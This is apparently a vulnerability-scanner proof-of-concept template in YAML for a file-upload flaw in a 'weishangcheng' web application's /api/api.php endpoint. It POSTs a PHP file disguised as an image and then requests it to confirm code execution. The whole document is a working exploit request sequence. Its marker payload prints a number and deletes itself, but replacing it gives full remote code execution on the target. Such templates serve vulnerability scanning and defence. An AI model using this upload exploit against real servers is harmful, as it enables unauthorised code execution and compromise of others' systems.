name: poc-yaml-weishangcheng-api.php-File-upload
transport: http


rules:
  r0:
    request:
      method: POST
      path: /api/api.php?mod=upload&type=1
      headers:
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
        Content-Type: multipart/form-data; boundary=d0b7a0d40eed0e32904c8017b09eb305
      body: 
       "--d0b7a0d40eed0e32904c8017b09eb305\r\n\
        Content-Disposition: form-data; name=\"file\"; filename=\"rce.php\"\r\n\
        Content-Type: image/png\r\n\
        \r\n\
        <?php print(111*222);unlink(__FILE__);?>\r\n\
        --d0b7a0d40eed0e32904c8017b09eb305--\r\n\
        "
    expression: response.status == 200
    output:
      search: '"(?P<uploadfile>[a-zA-Z0-9-]+\\.php)".bsubmatch(response.body)'
      uploadfile: search["uploadfile"]

  r1:
    request:
      method: GET
      path: /upload/{{uploadfile}}
    expression: response.status == 200 && response.body.bcontains(b'24642')

expression: r0() && r1()

